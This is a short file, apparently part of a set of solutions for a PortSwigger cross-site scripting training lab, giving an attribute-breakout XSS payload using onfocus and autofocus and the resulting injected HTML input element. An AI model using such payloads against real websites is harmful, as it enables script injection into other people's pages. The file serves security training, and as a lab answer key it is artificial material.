@@ -1,0 +1,8 @@
+<!-- The payload below is meant to solve the following lab: -->
+<!-- https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded -->
+
+<!-- Payload: -->
+shoes" onfocus="alert(1)" autofocus tabindex="1
+
+<!-- Result: -->
+<input type="text" placeholder="Search the blog..." name="search" value="shoes" onfocus="alert(1)" autofocus="" tabindex="1">
